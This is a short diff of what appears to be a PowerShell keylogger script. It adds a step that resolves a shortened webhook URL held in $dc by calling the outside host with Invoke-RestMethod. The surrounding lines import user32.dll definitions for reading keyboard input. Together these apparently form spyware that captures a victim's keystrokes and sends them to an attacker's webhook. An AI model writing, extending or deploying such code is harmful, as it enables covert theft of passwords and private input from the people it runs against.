@@ -1,3 +1,7 @@
+
+# shortened URL Detection
+if ($dc.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $dc = (irm $dc).url}
+
 # Import DLL Definitions for keyboard inputs
 $API = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
